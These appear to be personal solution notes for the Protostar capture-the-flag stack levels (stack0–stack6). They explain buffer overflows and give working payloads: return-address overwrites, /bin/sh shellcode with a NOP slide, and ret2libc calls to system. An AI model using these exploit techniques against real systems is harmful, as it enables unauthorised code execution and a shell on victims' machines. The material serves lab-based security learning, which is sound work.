stack0: python -c "print('\x41' * 64 + '\x64\x63\x62\x61')" | ./stack0

	The stack looks like this:
		esp			[ebp - 104]
		.
		.
		.
		buffer		[ebp - 16]
		buffer		[ebp - 12]
		buffer		[ebp - 8]
		modified	[ebp - 4]
		ebp			[ebp]
		return addr [ebp + 4]
		argc 		[ebp + 8]
		argv 		[ebp + 12]
	
	the buffer variable is just a pointer to the beggining of the buffer ([ebp - 64]).
	gets cant tell if we insert more data than the size of the buffer.
	so writing more than 64 characters will override the "modified" local variable!

stack1: ./stack1 $(python -c "print('\x41' * 64 + '\x64\x63\x62\x61')")

	The stack looks like this:	
		esp			[ebp - 104] (can see the stack up ebp by x/104b or x/26x [cause 104/4=26])
		.
		.
		.
		buffer		[ebp - 16]
		buffer		[ebp - 12]
		buffer		[ebp - 8]
		modified	[ebp - 4]
		ebp 		[ebp]
		return addr [ebp + 4]
		argc 		[ebp + 8]
		argv 		[ebp + 12]
		
	strcpy does not check how much it copied.
	the '\x64\x63\x62\x61' is reveresed because of endianity

stack2: export GREENIE=$(python -c "print('\x41' * 64 + '\x0a\x0d'*2)"); ./stack2


stack3: python -c "print('\x41'*64 + '\x24\x84\x04\x08')" | ./stack3
	
	find the address of win:
		with objdump:
			way no.1:
				objdump -t stack3 ==> win=08048424 (symbol table)
			way no.2:
				objdump -d stack3 | grep win ==> win=08048424 (disassembly)
		with gdb:
			way no.1:
				disassemble win ==> 0x08048424 (disassembly)
			way no.2:
				info address win ==> Symbol "win" is a function at 
				address 0x8048424 (literally find address where symbol is stored)
			way no.3:
				x win ==> 0x08048424
				
stack4: python -c "print('\x41' * 76 + '\xf4\x83\x04\x08')" | ./stack4
	
	concept - override the return address in the stack to go to win at the end of main
	
	1. find the address of win (like stack3): win ==> 0x080483f4
	2. find the amount of bytes between "buffer" and "return address":
			a. x/x $esp ==> 0xbffff6b0:     0xbffff6c0
			b. x/x $ebp ==> 0xbffff708:     0x41414141
			c. 0xbffff708 - 0xbffff6b0 = 88
			d. putting 'AAAA' shows us that "buffer" starts at 0xbffff6c0:     0x41414141
			   (which means there are other data between $esp and the start of buffer)
			e. the correct calc: 0xbffff708 - 0xbffff6c0 = 72
			d. we also want to override ebp itself, so we need to put 76 'A's before we get
			   to the return address
	
	
stack5: (/tmp/pyshell.py; cat) | /opt/protostar/bin/stack5

	The stack contains a lot of data. some of it is the environment variables.
	These variables are stored in higher addresses than our program, so different 
	variables define different locations for are program to be stored in stack.
	therefore - we can not determine exactly where our data is located during runtime, 
	and cannot know where our shellcode will be stored!
	
	The solution to this is called nop slide - we define an arbitrary, high-address 
	place where our shellcode will be stored, and put a lot of NOPs before it.
	Then, we set eip to be somewhere that we think will be between our program and the
	shellcode - somewhere in the NOP slide!
	That way, the program that runs after we override eip is some nops, and then our shellcode!
	
	in our example, the python script to do this is pyshell.py:
		As = 'A' * 76  #fill all the data to eip, overriding eip on the way					
		eip = 0xbffff800 #set eip to some higher address
		eip_str = '\x00\xf8\xff\xbf' #little endian string
		nops = '\x90' * 100 #our nop slide! put this between eip and our shellcode
		shell = '\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e' #the shellcode

		print As + eip_str + nops + shell
	
	The next thing to do is run this with cat, for interactivity
	

	
 stack6:
	try no.2.0 - ret2libc
		1. find the address of system
			gdb stack6 --> print system
			system_addr = 0xb7ecffb0
		2. system_param_str = /bin/sh\x00
		3. buffer + ebp = 80
		4. return_address_after_system = 4 * B
		5. system_param_addr = The start of the buffer - we use this address as the argument for system and put 
			the /bin/sh\x00 in it.
			running ltrace from /opt/protostar/bin/ we find its in 0xbffff78c 
		
		payload - system_param_str + 70 * A + system_addr + return_address_after_system + system_param_addr
			
		the script: 
			system_addr = '\xb0\xff\xec\xb7'
			system_param_str = '/bin/bash\x00'
			system_param_addr = '\x5c\xf7\xff\xbf'

			print system_param_str + 70 * 'A' + system_addr + 4 * 'B' + system_param_addr
	
	try no.2.1
		like 2.0, but instead of placing the "/bin/sh\x00" param in the stack (which is unreliable
		and can change from different runs because of the environment variables, we can search 
		the string in the libc library itself and point to that address:
			1. find "/bin/sh\x00" string in libc
				* strings -tx /lib/libc.so.6 | grep /bin/sh ==> finds /bin/sh in hex offset 11f3bf
				*  in gdb - info proc map ==> libc is located at 0xb7e97000
				so - the address of /bin/sh is 0xb7e97000 + 0x11f3bf = 0xb7fb63bf
				(we can check that with  x/s 0xb7e97000 + 0x11f3bf)
		so the script:
			system_addr = '\xb0\xff\xec\xb7'
			sh_string_addr = '\xbf\x63\xfb\xb7'
			return_after_system = 'B' * 4
			print 80 * 'A' + system_addr + return_after_system + sh_string_addr


	
	
	try no.3 - duplicate return. set eip to the ret instruction in the original code, and 
	the next 4 bytes after eip to the shell code (NOPs slide). this will first return to 
	the ret instruction (which is not on the stack, so it will pass the check), and then
	return to our shellcode, with no protection check.
		1. address of ret - 0x080484f9
	
	the script:
		As = 'A' * 80
		ret_address = '\xf9\x84\x04\x08'
		eip = '\x00\xf8\xff\xbf'
		nops = '\x90' * 150
		shell = '\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e'

		print As + ret_address + eip + nops + shell
	
	
	
	
	
	
	
	
	
	
	
	

	

failed attempts:
stack6:
	Try no.1 - change the return address of main to NOPs slide to shellcode, while keeping the return address of 
	getpath the correct address (line 28 in main)
	
		1. find the correct return address from getpath to main:
				way no.1 - run gdb and look at the return address (ebp + 1)
					return addr = 0x08048505
				way no.2 - disassemble main:
					address after calling getpath = 0x08048505
		2. find the location of the return address from main in the stack
				way no.1 - gdb
					As we know, the locations of data on the stack can change, because of the
					environment variables. So, instead of finding the location of the return
					addr from main on the stack, we will find the distance between it and 
					other data we know to find, like the buffer or the return addr from getpath.
					The distances will always be the same, because the assembly code will always
					be the same.
						from /tmp: 
							* the return address from main is located at 0xbffff7bc
							* the return address from getpath is located at 0xbffff7ac
							* the buffer starts at 0xbffff75c
							--> there are 80 bytes between the start of the buffer and the return 
								addr of getpath (including one of them)
							--> there are 16 bytes between the return addr of getpath to the return
								addr of main (including one of them)
							
						from opt/protostar/bin/stack6: 
							* the return address from main is located at 0xbffff7ac
							* the return address from getpath is located at 0xbffff79c
							* the buffer starts at 0xbffff74c
							--> there are 80 bytes between the start of the buffer and the return 
								addr of getpath (including one of them)
							--> there are 16 bytes between the return addr of getpath to the return
								addr of main (including one of them)
		3. determine the address to set eip to:
			lets say 0xbffff800
		
		input = As	* 80 + 0x08048505 + Bs * 12 + 0xbffff800 + '\x90' * 150 + shellcode
	
	

	
	
	
	
	